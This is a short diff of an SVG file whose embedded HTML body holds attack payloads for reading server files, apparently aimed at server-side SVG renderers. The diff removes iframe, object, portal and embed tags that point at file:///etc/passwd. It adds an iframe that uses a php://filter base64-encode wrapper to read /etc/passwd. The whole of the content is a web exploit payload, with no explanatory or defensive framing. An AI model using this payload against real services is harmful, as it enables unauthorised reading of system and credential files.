@@ -2,11 +2,7 @@
   <g transform="translate(300, 0) rotate(20)">
     <foreignObject x="10" y="10" width="800" height="800">
       <body xmlns="http://www.w3.org/1999/xhtml">
-<iframe src="https://www.aswsec.com/"> </iframe>
-<object data="file:///etc/passwd"></object>
-<portal src="file:///etc/passwd" id="portal"></portal>
-<embed src="file:///etc/passwd>" width="400" height="400"></embed>
-<iframe src="file:///etc/passwd"> </iframe>
+<iframe src="php://filter/read=convert.base64-encode/resource=file:///etc/passwd"> </iframe>
 
 
       </body>
